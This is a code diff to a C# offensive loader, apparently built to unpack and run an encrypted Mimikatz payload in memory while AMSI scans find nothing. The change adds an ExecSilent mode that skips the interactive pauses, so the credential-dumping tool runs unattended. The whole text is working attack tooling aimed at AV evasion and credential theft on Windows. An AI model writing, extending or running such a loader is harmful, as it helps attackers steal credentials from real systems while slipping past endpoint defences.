@@ -63,6 +63,8 @@ namespace KatzAssembly
 
     public static class Katz
     {
+        public static bool Enter = true;
+
         private const UInt32 StdOutputHandle = 0xFFFFFFF5;
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetStdHandle(UInt32 nStdHandle);
@@ -76,6 +78,12 @@ namespace KatzAssembly
             Exec();
         }
 
+        public static void ExecSilent()
+        {
+            Enter = false;
+            Exec();
+        }
+
         public static void Exec()
         {
 
@@ -84,7 +92,8 @@ namespace KatzAssembly
             Console.WriteLine("Now our AppDomain, Assembly and Module where scanned via AMSI, but no any detections. Why?");
             Console.WriteLine("Memory stay clear too, because Mimikatz payload, that contains in assembly, are encrypted  :-)");
             Console.WriteLine("Ready for unpack and execute\nEntering red zone - lots of detecable artifacts\n[press enter to unpack & execute Mimikatz]", Console.ForegroundColor = ConsoleColor.Red );
-            Console.ReadLine();
+            if (Enter)
+                Console.ReadLine();
             byte[] unpacked = null;
             try
             {
@@ -323,13 +332,15 @@ namespace KatzAssembly
             t.Wait();
             t.Dispose();
             Console.WriteLine("Mimikatz Thread Complete, still lots of artifacts, including unsafe (\"manually\") allocated memory\n[enter to clear unsafe allocated memory]");
-            Console.ReadLine();
+            if (Enter)
+                Console.ReadLine();
 
             NativeDeclarations.VirtualFree(codebase, 0, NativeDeclarations.FreeType.Release);
             
             Console.WriteLine("We just freed memory, that allocated manually.");
             Console.WriteLine("Now only safe allocated (GC) AppDomain, Assembly and Module artifacts are in memory\n[enter to finish execution and leave AppDomain, Assembly and Module]");
-            Console.ReadLine();
+            if (Enter)
+                Console.ReadLine();
 
         } //End Main
 
